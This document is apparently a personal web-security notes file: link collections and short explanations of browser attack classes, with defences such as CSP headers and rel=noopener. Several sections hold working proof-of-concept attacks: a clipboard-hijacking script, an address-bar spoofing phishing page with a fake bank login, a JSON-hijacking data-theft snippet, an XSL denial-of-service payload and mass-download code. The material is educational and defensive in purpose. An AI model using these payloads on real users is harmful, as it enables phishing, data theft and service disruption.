- [Exploring OS X Preview Signatures – mikeymikey blogs here](http://michaellynn.github.io/2015/07/26/exploring-os-x-preview-signatures/) - Decode data from macOS Preview Signatures
- [class-dump - Steve Nygard](http://stevenygard.com/projects/class-dump/) - Generates declarations for the classes, categories and protocols from Objective-C runtime information stored in Mach-O files
- [RE for Beginners | Reverse Engineering](https://www.begin.re/)
- [Reverse Engineering Stickies.app - Low Level Bits](https://lowlevelbits.org/reverse-engineering-stickies.app/)

#### Alternative data storage

See also [Steganography](#steganography)

Use (abuse) special cases where the data storage have different (better) quota limitation:

- Google Docs take up 0 bytes of quota in your Google Drive
- 1 TB of free storage for Flickr users (images only)
- Amazon Drive: the Prime Photos plan offers unlimited storage for photos and RAW files
- Google Docs store complete history version of the document (keystrokes?)
- YouTube imposes no limits on the total number or length of videos users can upload, pixels of each frames to store data
- URL shorteners
- Gmail allow in 2006 a large amount of storage for email attachments
- Usenet store data files
- create multi accounts

Inject data ZIP at the end of a valid image, for platform that don't reencode/destroy appended data to images (ex: GIF)

- [How to Use Your New Terabyte of Free Flickr Storage for More Than Just Photos Using This Hack « Digiwonk :: Gadget Hacks](https://digiwonk.gadgethacks.com/how-to/use-your-new-terabyte-free-flickr-storage-for-more-than-just-photos-using-hack-0147022/)
- [At the risk of "ruining" it for some users, Amazon doesn't appear to validate no... | Hacker News](https://news.ycombinator.com/item?id=13998534)
- [GmailFS - Gmail Filesystem](https://web.archive.org/web/20060424165737/http://richard.jones.name/google-hacks/gmail-filesystem/gmail-filesystem.html)
- [dzhang314/YouTubeDrive: Store files as YouTube videos == infinite disk space](https://github.com/dzhang314/YouTubeDrive)
- [stewartmcgown/uds: Unlimited Drive Storage by splitting binary files into base64](https://github.com/stewartmcgown/uds)
- [tuxxy/BandcampFS: BandcampFS is a proof of concept that allows people to backup files to bandcamp.com via WAV files.](https://github.com/tuxxy/BandcampFS)
- [hansendc/gmailfs: FUSE-based filesystem for using an IMAP server (like gmail) as normal storage like a hard disk.](https://github.com/hansendc/gmailfs)
- [NZB — Wikipedia](https://en.wikipedia.org/wiki/NZB)
- [Usenet — Wikipedia](https://en.wikipedia.org/wiki/Usenet#Binary_content)
- [DNSFS. Store your files in others DNS resolver caches](https://blog.benjojo.co.uk/post/dns-filesystem-true-cloud-storage-dnsfs) - [DNSFS – Store files in others' DNS resolver caches | Hacker News](https://news.ycombinator.com/item?id=16134041)
- [WarrenGreen/InfiniteDrop: Distributed FileSystem across Dropbox accounts](https://github.com/WarrenGreen/InfiniteDrop)

### Vulnerabilities

See [Know your weaknesses](#know-your-weaknesses)

- Fake hotspot: [Wifi ouvert - Attention aux faux hotspot ! (+ une démo avec un module Arduino) - Korben](http://korben.info/wifi-ouvert-attention-aux-faux-hotspot-demo-module-arduino.html?utm_source=dlvr.it&utm_medium=twitter)
- [Malware in the browser: how you might get hacked by a Chrome extension](https://kjaer.io/extension-malware/)
- [Real Future: What Happens When You Dare Expert Hackers To Hack You (Episode 8) - YouTube](https://www.youtube.com/watch?v=bjYhmX_OUQQ)
- [Crooks can guess Visa card details in six seconds by querying lots of websites at once / Boing Boing](https://boingboing.net/2016/12/04/crooks-can-guess-visa-card-det.html)
- [Category:Computer security stubs — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_stubs)
- [Category:Computer security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_exploits)
- [Category:Web security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Web_security_exploits)
- [Category:Algorithmic complexity attacks — Wikipedia](https://en.wikipedia.org/wiki/Category:Algorithmic_complexity_attacks)
- [Deadlock — Wikipedia](https://en.wikipedia.org/wiki/Deadlock)
- [CWE - 2011 CWE/SANS Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/index.html#Listing)
- [OWASP Top Ten Cheat Sheet - OWASP](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet)
- [Category:OWASP Top Ten Project - OWASP](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
- [Detecting the use of "curl | bash" server side | Application Security](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)
- [Category:Vulnerability - OWASP](https://www.owasp.org/index.php/Category:Vulnerability)
- [Minded Security Blog: Ye Olde Crockford JSON regexp is Bypassable](http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html)
- [Hacking Printers](http://hacking-printers.net/wiki/index.php/Main_Page) [Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- Fixes for previous version don't be protected against new language possibilities [ECMAScript 6 from an Attacker's Perspective - Breaking Frameworks, Sa…](http://www.slideshare.net/x00mario/es6-en)
- Graphics Interchange Format Java Archives (GIFAR) malware [Gifar - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Gifar)
- [A Chip Flaw Strips Away a Key Hacking Safeguard for Millions of Devices | WIRED](https://www.wired.com/2017/02/flaw-millions-chips-strips-away-key-hacking-defense-software-cant-fully-fix/amp/) - See [AnC - VUSec](https://www.vusec.net/projects/anc/)
- [Web Security Research» Alex's Corner: HTTP Range & Request-Range Request Headers](http://kuza55.blogspot.fr/2008/02/http-range-request-range-request.html) - Flash block scripts that write HTTP header `Range`, but not `Request-Range` (blocked starting Flash 9.0.115). Apache support both. See [Troubleshoot ActionScript error in Flash Player](https://helpx.adobe.com/flash-player/kb/actionscript-error-send-action-contains.html)
- [lame hackers guide: Weaponizing PostScript](https://lamehackersguide.blogspot.fr/2017/02/weaponizing-postscript.html) - PostScript vulnerability: open files
- [ServiceWorker is dangerous](https://alf.nu/ServiceWorker) - ServiceWorker on subdomain with pages contains user's scripts
- [HTTP Parameter Pollution with cookies in PHP | Application Security](https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/) - Coookie pollution using rogue cookie: `session_id=123` = `session_id%00blah==123`
- [Hostile Subdomain Takeover using Heroku/Github/Desk + more](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/) - hacked via DNS subdomain takeover via DNS entries for a domain people aren’t aware of.
- [Broken Browser – Fun with Browser Vulnerabilities](http://www.brokenbrowser.com/)
- [Exploits Database by Offensive Security](https://www.exploit-db.com/)

Fuzzing test

About fuzzing test with JPEG data:

> It starts with an invalid .jpg (literally a text file containing "hello"), and by trying over and over, changing random bytes and tracing the execution of the decoder program as it is fed the corrupted input, it will drill deeper and deeper into the program until it has gotten far enough that the input is actually a valid .jpg, without any human input.
> 
> Fuzzing like this is a very effective technique for finding (security) bugs in programs that parse input, because you will quickly end up with "impossible" input nobody thought to check for (but is close enough that it won't be rejected outright), and whoops there's your buffer overflow.
> [...]
> it just finds one input that makes the program exit with exit code zero (for success)
— [Pulling JPEGs out of thin air | Hacker News](https://news.ycombinator.com/item?id=8571879)

- [Fuzzing — Wikipedia](https://en.wikipedia.org/wiki/Fuzzing)
- [lcamtuf's blog: Pulling JPEGs out of thin air](https://lcamtuf.blogspot.fr/2014/11/pulling-jpegs-out-of-thin-air.html) - Use genetic algorithm to generate data that test vulneratilities. See [american fuzzy lop](http://lcamtuf.coredump.cx/afl/)

Four General Attack-Vectors:

- A1: Attacking the Sandbox
- A2: Attacking the Sanitizer
- A3: Attacking the CSP Mode
- A4: Attacking the Codebase

#### Libraries

Front end, back end. Third party or internal. **Update it as soon as possible.**

- [Thou shalt not depend on me: analysing the use of outdated JavaScript libraries on the web | the morning paper](https://blog.acolyer.org/2017/03/07/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/)

#### Spoofed UI

Look like phishing / spoofing trusted UI

- [The Line of Death – text/plain](https://textslashplain.com/2017/01/14/the-line-of-death/)
- fullscreen document (can display a fake OS / browser UI)
- [Beware! Don't Fall For "Font Wasn't Found" Google Chrome Malware Scam](http://thehackernews.com/2017/02/HoeflerText-font-chrome.html)
- [Clickjacking](#clickjacking)
- [Tabnabbing and Address Bar Spoofing](#tabnabbing-and-address-bar-spoofing)
- [Pastejacking](#pastejacking)
- [Fake History](#fake-history)
- [Email spoofing — Wikipedia](https://en.wikipedia.org/wiki/Email_spoofing)
- [Phishing — Wikipedia](https://en.wikipedia.org/wiki/Phishing)
- [The Attack of the Alerts and the Zombie Script – Broken Browser](https://www.brokenbrowser.com/zombie-alert/)

#### DOM clobbering

**Don't name your inputs or buttons `submit`, `action`, `method`, `style`, `dataset`, `id`, `attributes`, `children`, etc.**

	<form id="form" action="somewhere" method="post">
		<input type="text" name="action" value="pay">
		<input type="text" name="method" value="credit-card">
		<input type="text" name="attributes" value="something">
		<button name="submit">Send</button>
	<form>
	<script>
		let form = document.getElementById("form");
		form === window.form
		form.action// HTMLInputElement instead of String "somewhere"
		form.method// HTMLInputElement instead of String "post"
		form.submit// HTMLButtonElement instead of Function
		form.attributes// HTMLInputElement instead of NamedNodeMap
	</script>

	<div id="myId"></div>
	<script>
	myId                            // [object HTMLDivElement]
	myId.id                         // "myId"
	window.myId.id                  // "myId"
	this.myId.id                    // "myId"
	self.myId.id                    // "myId"
	top.myId.id                     // "myId"
	"myId" in window                // true
	window.hasOwnProperty("myId")   // true
	</script>

An implicit id can't have the same name as a protected JS keyword and can't overload a native global var, such as `window.screen`:

	<div id=function></div>
	<script>alert(function) // SyntaxError: Unexpected token )</script>

- [DOM clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
- [In the DOM, no one will hear you scream](https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream)
- [cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:](https://github.com/cure53/DOMPurify)
- [DOMLint - Test suite against HTML/DOM conflicts](https://kangax.github.io/domlint/)
- [Microsoft/JSanity: A secure-by-default, performance, cross-browser client-side HTML sanitization library](https://github.com/Microsoft/JSanity)
- [JavaScript variable names you shouldn’t use - NCZOnline](https://www.nczonline.net/blog/2007/06/03/javascript-variable-names-you-shouldn-t-use/)
- [Unsafe Names for HTML Form Controls](http://www.jibbering.com/faq/names/)
- [Implicit getElementById's](http://xem.github.io/articles/#implicitgetelementbyid_en)

#### Clickjacking

	<script>
		if (self !== top) {
			document.body.style.display = "none";
			top.location = self.location;
		}
	</script>

Use header `Content-Security-Policy: frame-ancestors 'self'` (or the depreciated `X-Frame-Options: SAMEORIGIN`)

- [CSP Policy Directives - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors)
- [X-Frame-Options - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [Clickjacking Defense Cheat Sheet - OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)
- [Custom animated cursor via canvas / Stoyan's phpied.com](http://www.phpied.com/custom-animated-cursor-via-canvas/) can be used for clickjacking the browser UI (see https://jameshfisher.github.io/cursory-hack/)

#### Pastejacking

After a copy action:

	<pre>echo "not evil"</pre>
	<script>
	// Hijack copied data and put an evil command
	document.addEventListener("copy", event => {
		console.log(event);
		event.clipboardData.setData("text/plain", "echo \"evil\"\r\n");
		event.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
	});
	</script>

After other action (with or without timeframe): keydown, (inputs) change, click, dblclick, mouseup, (inputs) reset, (form) submit
Even if the timeframe is not supported, you can add delay after the action by using infinite loop over a short periode of time: the user use keyboard to copy (Crtl+C/Cmd+C) wait 800ms (limited by the maximum execution time limit for long-running scripts) and overwrite the copied value

- [A demo of overriding what's in a person's clipboard](https://github.com/dxa4481/Pastejacking)
- "Event handlers that are allowed to modify the clipboard" [Clipboard API and events](https://www.w3.org/TR/clipboard-apis/#event-handlers-that-are-allowed-to-modify-the-clipboard)
- "algorithm is allowed to show a popup" [5 Loading Web pages — HTML5](https://www.w3.org/TR/html5/browsers.html#allowed-to-show-a-popup)
- [Document.execCommand() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand#Browser_compatibility)
- [copy - Event reference | MDN](https://developer.mozilla.org/en-US/docs/Web/Events/copy)
- [clipboardData object (Internet Explorer)](https://msdn.microsoft.com/en-us/library/ms535220%28v=vs.85%29.aspx) https://developer.microsoft.com/en-us/microsoft-edge/platform/status/clipboardapi/ https://connect.microsoft.com/IE/feedback/details/1572456/edge-clipboard-api-text-html-content-messed-up-in-event-clipboarddata

#### Tabnabbing and Address Bar Spoofing

Link and `target="_blank"` or `window.open()`

	<a href="http://host/maliciousepage.html" target="_blank">My profile on an other network</a>

It's a security issue if the link is provided by user or if the original link has been hacked/squatted (owner change), in the target document `window.opener` is accessible and can change it `location`.

Use [`rel="noreferrer"`](https://html.spec.whatwg.org/multipage/semantics.html#link-type-noopener) (`window.opener` - opener browsing context - will be nulled) or use a redirect mechanism (http://host/redirect?signature=XXXXXX&url=XXXX) will set `window.opener` to null then redirect:

	HTTP/1.0 200 OK
	<head><noscript><meta http-equiv="refresh" content="0;URL='__final_url__'"></noscript><title>__final_url__</title></head><script>window.opener=null;location.replace("__final_url__")</script>

Or use JavaScript:

	let target = window.open("about:blank"/*other params*/);
	target.document.write(`<script>window.opener=null;location.replace("${url}")</script>`);
	// data URI can't be used here because of IE. You can use blob URI, but it's not pratical because we need to revoke the object URL once the popup is loaded

- [Tabnabbing attack on Facebook](https://gist.github.com/mems/df881c9495b6744b650c)
- [Tabnabbing — Wikipedia](https://en.wikipedia.org/wiki/Tabnabbing)
- [Phishing by navigating browser tabs - Bughunter University](https://sites.google.com/site/bughunteruniversity/nonvuln/phishing-with-window-opener)
- [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)
- [Window.opener - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener)
- [Issue 156712 - chromium - html anchors set window.opener (spoofing/phishing threat) - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=156712)
- [Links to Unrelated Browsing Contexts - WHATWG Wiki](https://wiki.whatwg.org/wiki/Links_to_Unrelated_Browsing_Contexts)
- [Target="_blank" is an underestimated vulnerability | Hacker News](https://news.ycombinator.com/item?id=11631292)
- [Login-stealing phishing sites conceal their evil with lots of hyphens in URL | Ars Technica](https://arstechnica.com/security/2017/06/phishing-attacks-target-mobile-browsers-with-dash-padded-urls/)

Opener attack opened (inverse technique):

	/*
	If you don't get it, banking.beaver-peak.us is a trusted banking website;
	everything else is attacker-controlled. We begin by opening the legitimate
	banking website, and giving the user enough time to examine the address bar.
	
	There is a common misconception that changing the URL must result in a visible
	page transition that alerts the user to foul play, but that's not the case.
	
	PS. In older versions of Firefox, where the http:// prefix is not hidden,
	this will look a bit less convincing due to the misalignment of URLs. Easy to
	fix, but upgrade your browser already.
	
	PPS. Bonus question: can you do something useful by flipping two pages
	very rapidly, especially with history.*? What are the implications for
	clickjacking & friends?
	*/
	var spaces = 
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          " +
	  "                                                                          ";
	var bank_html =
	  '<title>Beaver Peak Banking and BBQ</title>' +
	  '<img src="http://banking.beaver-peak.us/banking_interface/beaver-peak.jpg" style="float: left; margin-right: 10px">' +
	  '<font size=+3 color=steelblue><b>Beaver Peak Banking and BBQ</b></font><br>' +
	  '<i>"Best steaks in town!"</i> -- Creek and Brook Daily<br clear="all"><p> ' +
	  '<font color=crimson>Security tip: confirm that <i>http://banking.beaver-peak.us/</i> is present in the address bar!</font>' +
	  '<p><b>Please login to our secure banking system:</b><p><table><tr><td>Login:</td><td><input type=text></td></tr><tr>' +
	  '<td>Password:</td><td><input type=password></td></tr></table><p><input type=submit value="Log in!">' +
	  '<p><div style="border-width: 1px 0 0 0;border-color:steelblue; border-style:solid">' +
	  '<font color=gray size=-1>Member FDIC. FDA certified. Truck parking available.</font></div>';
	
	var originalURL = 'http://banking.beaver-peak.us/banking_interface/';
	var fakeURL = 'http://banking.coredump.cx/us/banking_interface/';
	function dostuff() {
	  /* Precache */
	  if (navigator.userAgent.indexOf('; MSIE') != -1) {
	    var x = new Image();
	    x.src = fakeURL;
	  }
	  w = window.open(originalURL, 'target');
	  setTimeout(dostuff2, 7500);
	}
	
	function dostuff2() {
	  if (navigator.userAgent.indexOf('; MSIE') != -1)
	    w.open(fakeURL,'target');
	  else if (navigator.userAgent.indexOf('Opera/') != -1)
	    w.location.replace('data:text/html;charset=UTF-8,.beaver-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
	  else
	    w.location.replace('data:text/html;charset=UTF-8,-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
	}
	
	<p>illustrates the effectiveness of using
	data: or precached content to do the deed. Should work neatly in
	up-to-date browsers. You're probably fooling yourself if you 
	think you'd reliably spot this happening to you in the wild.</p>
	<a href="http://banking.beaver-peak.us/banking_interface/" onclick="dostuff()">Beaver peak bank</a>

- [lcamtuf's blog: The old switcharoo](http://lcamtuf.blogspot.fr/2011/12/old-switcharoo.html)
- [The old seamless switcharoo](http://lcamtuf.coredump.cx/switch/)
- [You sniff MIME / assume HTML on what?](http://lcamtuf.coredump.cx/switch/index2.html)
- [lcamtuf's blog: Yes, you can have fun with downloads](http://lcamtuf.blogspot.fr/2012/05/yes-you-can-have-fun-with-downloads.html)
- [Fake download](http://lcamtuf.coredump.cx/fldl/)
- [Download demo](http://hallvord.com/temp/moz/dl.htm)
- [Google Chrome, Firefox Address Bar Spoofing Vulnerability - Miscellaneous Ramblings of A Hacker](http://www.rafayhackingarticles.net/2016/08/google-chrome-firefox-address-bar.html)
- [Sebastian Kaspari on Twitter: "The URL in @FennecNightly is now scrollable and will be scrolled to the "base domain" by default. CC @gcpascutto (Thanks @buttercookie42) https://t.co/KRhDqfOLpo"](https://twitter.com/Anti_Hype/status/907948793047416832)

Use Multipart replace resource:

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)
- [Page load processing model for `multipart/x-mixed-replace` resources](https://www.w3.org/TR/html5/single-page.html#read-multipart-x-mixed-replace)

Interrupt navigation and rewrite content of the document

	// Navigate to other document... then:
	window.onunload = function()
	{
		document.execCommand("stop");
		setTimeout('document.write("Spoofed URL on Edge");document.close();');
	}

- [Microsoft Edge - AddressBar Spoof](http://www.cracking.com.ar/demos/edgespoof/2/)
- https://mobile.twitter.com/magicmac2000/status/779339530872692737

#### DNS rebinding

- [DNS rebinding — Wikipedia](https://en.wikipedia.org/wiki/DNS_rebinding)

#### Fake History

- [Stealing the users back button with the History API – Ryan Seddon](https://www.thecssninja.com/javascript/stealing-history-api)

#### HTTP/0.9 vulnerability

Response without HTTP overhead "HTTP/1.0 200 OK" nor any header, just the content

Allow potential XSS attacks to ASCII protocols (like SMTP, NNTP, POP3, IRC, etc.) via POST requests

	<form method="post" action="http://mail.example.org:25/">
		<textarea>
	HELO example.com
	MAIL FROM:<somebody@example.com>
	RCPT TO:<recipient@example.org>
	DATA
	Subject: Hi there!
	From: somebody@example.com
	To: recipient@example.org
	Hello world!
	.
	QUIT
		</textarea>
	</form>
	<!--
	The result will be:
	220 mail.example.org ESMTP Hi there!
	500 Command unrecognized
	[...]
	500 Command unrecognized
	250 mail.example.org Hello example.com [10.11.12.13]
	250 <somebody@example.com> is syntactically correct
	250 <recipient@example.org> is syntactically correct
	354 Enter message, ending with "." on a line by itself
	250 OK id=15IYAS-00073G-00
	221 mail.example.org closing connection
	-->

- [Issue 624462 - chromium - Reduce cases where HTTP/0.9 is supported - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=624462)
- [Issue 600352 - chromium - Security: Cross-Protocol Theft from non-HTTP services via DNS rebinding + HTTP/0.9 - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=600352)
- https://bugzilla.mozilla.org/show_bug.cgi?id=1262128
- [The HTML Form Protocol Attack — Jochen Topf](https://www.jochentopf.com/hfpa/hfpa.pdf) https://www.jochentopf.com/hfpa/

#### Backdoors

**It's a breach of your security system. Anyone can found and use it.**

- https://github.com/Xyl2k/TSA-Travel-Sentry-master-keys
- [Travel Sentry - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Travel_Sentry#Master_Key_Compromise)
- [Transportation Security Administration - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Transportation_Security_Administration#Luggage_locks)

#### Time sync issue

If NTP is spoofed

> Changing time on devices is more an annoyance than anything, and doesn't necessarily get you into a device.

How about you set the time on your server ahead by 5 years:

- Most of your passwords would expire
- All your SSL certs would expire
- All your TOTPs, like Google Authenticator would fail
- All your IPSEC tunnels would drop, and refuse to restart
- Many of your cron jobs would got nuts, possibly deleting all your logs
- Much of your DNSSEC would expire
- Many of your backups would be deleted since they 'expired'

Fack: setting your iPhone to 1 Jan 1970 would brick it. Fixed in iOS 9.3

- [Why 1/1/1970 Bricks Your iPhone - YouTube](https://www.youtube.com/watch?v=MVI87HzfskQ)

- [NTP server misuse and abuse — Wikipedia](https://en.wikipedia.org/wiki/NTP_server_misuse_and_abuse)
- [network - Is NTP vulnerable to DNS poisoning or spoofing attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/4981/is-ntp-vulnerable-to-dns-poisoning-or-spoofing-attacks)

#### Cross site JSON access

GET request return JSON response as array `["foor", 2, "bar", "baz"]`, a third party document could access it, despit CS protections:

How it's works: rewrite Array constructor, which will be called by the engine when the json is parsed as JavaScript

> If the JSON starts directly with curly braces, it gets intepreted as a code block, rather than an object initializer, and nothing happens.

Require:

- JavaScript enabled / not blocked
- an old browser engine < ECMAScript 5
- the server don't send the header `X-Content-Type-Options: nosniff` or the browser don't support it
- the server don't block the client access (using the header `Origins`, access token, etc.)

`Access-Control-Allow-Origin` don't do any thing here

POC:

	<script type="text/javascript">
	var secretInfos;
	var arrayOrg = Array;// redefine Array constructor
	Array = function() {
		secretInfos = this;
	};
	</script>
	<script src="http://haacked.com/demos/secret-info.json"></script>
	<script>
	Array = arrayOrg;// restore Array constructor
	secretInfos = Array.prototype.slice.call(secretInfos);
	console.log(secretInfos);
	</script>

- [Redefining the Array constructor in javascript - Stack Overflow](https://stackoverflow.com/questions/15385588/redefining-the-array-constructor-in-javascript)
- [Jeremiah Grossman: Advanced Web Attack Techniques using GMail](http://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)
- [Anatomy of a Subtle JSON Vulnerability - You’ve Been Haacked](http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/)
- [JSON is not as safe as people think it is - Incompleteness](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)
- [robubu : Safe JSON](http://robubu.com/?p=24)
- [hackademix.net » You Don't Know What My Twitter Leaks](https://hackademix.net/2009/01/13/you-dont-know-what-my-twitter-leaks/)
- [JSON Hijacking - You’ve Been Haacked](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/)

#### Carpet-bombing

Can be done with iframes

	<iframe src="filetodownload1.exe"></iframe>
	<iframe src="filetodownload2.exe"></iframe>
	<iframe src="filetodownload3.exe"></iframe>

or with JS

	var dl_link = document.createElement('a');
	document.body.appendChild(dl_link);
	dl_link.setAttribute('href', "data:,Hello%2C%20World!");
	for(let i = 1; i <= 5; i++){
		dl_link.setAttribute('download', 'test_'+i+'.txt');
		dl_link.dispatchEvent(new MouseEvent("click"));// dl_link.click()
	}

- [Google Chrome vulnerable to carpet-bombing flaw | ZDNet](http://www.zdnet.com/article/google-chrome-vulnerable-to-carpet-bombing-flaw/)
- [127522 - Security: Chrome Allows "Carpet Bomb" from File Download - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=127522)
- [Carpet bombing — Wikipedia](https://en.wikipedia.org/wiki/Carpet_bombing)
- [Chrome Free Coupwns](http://raffon.net/research/google/chrome/carpet.html)
- [Microsoft Security Advisory 953818](https://technet.microsoft.com/en-us//library/security/953818)

#### Multipart replace resource

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)

#### SQL injection

- [Rails SQL Injection Examples](http://rails-sqli.org/)

#### Wordpress

On common attack use upload mecanism (provided by thridpart plugins) to execute PHP scripts

`/upload/.htaccess`:

	<Files *.php>
	Deny from all
	</Files>

Or DDoS by using pingbacks or xmlrpc. Disable it or whitelisted IPs in `.htaccess`

- [Attacking WordPress | HackerTarget.com](https://hackertarget.com/attacking-wordpress/)

#### HTML/SVG/XML vulnerabilities

The same for HTML files. See also `innerHTML`

All browsers/libs don't handle the same way this files

- [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
- [XXE](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing)
- [Billion laughs](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Billion_Laughs)
- [quadratic blowup](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- XSL DoS attack

		<?xml version="1.0"?>
		<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
		<!DOCTYPE responses [
			<!ATTLIST xsl:stylesheet id ID #REQUIRED>
		]>
		<root>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<node/>
			<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
				<xsl:template match="/">
					<xsl:for-each select="/root/node">
						<xsl:for-each select="/root/node">
							<xsl:for-each select="/root/node">
								<xsl:for-each select="/root/node">
									<xsl:for-each select="/root/node">
										<xsl:for-each select="/root/node">
											<xsl:for-each select="/root/node">
												<xsl:for-each select="/root/node">
													<xsl:for-each select="/root/node">
														<xsl:for-each select="/root/node">
															<pwnage/>
														</xsl:for-each>
													</xsl:for-each>
												</xsl:for-each>
											</xsl:for-each>
										</xsl:for-each>
									</xsl:for-each>
								</xsl:for-each>
							</xsl:for-each>
						</xsl:for-each>
					</xsl:for-each>
				</xsl:template>
			</xsl:stylesheet>
		</root>
	
	- [Security: A harmless SVG + XSLT curiousity](http://scarybeastsecurity.blogspot.fr/2011/01/harmless-svg-xslt-curiousity.html)
- etc.

Some attacks can be blocked by [Content Security Policy](#content-security-policy)

- [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [XML Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- [The innerHTML Apocalypse](http://www.slideshare.net/x00mario/the-innerhtml-apocalypse)
- https://hackinparis.com/data/slides/2011/09-TheForbiddenImage.pdf
- [HTML Purifier - Filter your HTML the standards-compliant way!](http://htmlpurifier.org/)
- https://github.com/cure53/DOMPurify
- https://github.com/notriddle/ammonia
- https://github.com/darylldoyle/svg-sanitizer
- [#24251 (Reconsider SVG inclusion to get_allowed_mime_types) – WordPress Trac](https://core.trac.wordpress.org/ticket/24251#comment:27)
- [web application - What does a HTML filter need to do, to protect against SVG attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/26264/what-does-a-html-filter-need-to-do-to-protect-against-svg-attacks/30390#30390)

#### XSS and injection vulnerabilities

See [XSS and injection prevention](#xss-and-injection-prevention)

- [XSS game](https://xss-game.appspot.com/) - [Google created an XSS game to teach you how to exploit and prevent them (x-post from /r/php) : webdev](https://www.reddit.com/r/webdev/comments/5s1ex0/google_created_an_xss_game_to_teach_you_how_to/)
- [HTTP/0.9 vulnerability](#http09-vulnerability)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- Some data can bypass CSP [Polyglot JPEG - JS file](#polyglot-jpeg---js-file)
- [The Shortest Reflected XSS Attack Possible - Fooling the Interpreter](http://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- [Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers - Randy Westergren](https://randywestergren.com/widespread-xss-vulnerabilities-ad-network-code-affecting-top-tier-publishers-retailers/)
- [PortSwigger Web Security Blog: Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
- [XSS Archive | XSSed.com](http://www.xssed.com/archive/)

#### SMS spoofing

By defining sender ID (sender name, OAdC - Originating Address Code) with a business name or phone number

Doesn't work for Canada, China, Taiwan and the USA. China, Mexico, South Africa, Belgium?

> A maximum of 11 characters or 12 digits, we recommend you only use letters and numbers as some handsets don’t correctly handle punctuation. If not specified, your account default will be used. If you’re sending with a text from address and your message isn’t delivered try again but change to sending from a telephone number - some international networks place restrictions on the from addresses they’ll accept. Due to US telecomunications rules you’re unable to set the from address when sending to the USA - the text will always come from 43704.
— [Send SMS using XML - Clockwork SMS API](https://www.clockworksms.com/doc/clever-stuff/xml-interface/send-sms/#from)

- [SMS spoofing — Wikipedia](https://en.wikipedia.org/wiki/SMS_spoofing)
- [telephony - How do some SMS messages transmit the senders name? - Stack Overflow](https://stackoverflow.com/questions/11605323/how-do-some-sms-messages-transmit-the-senders-name)
- [How to send someone SMS (text) from mobile and he/she receives a name instead of a number even though he/she does not have my mobile number in his/her contact - Quora](https://www.quora.com/How-do-I-send-someone-SMS-text-from-mobile-and-he-she-receives-a-name-instead-of-a-number-even-though-he-she-does-not-have-my-mobile-number-in-his-her-contact)
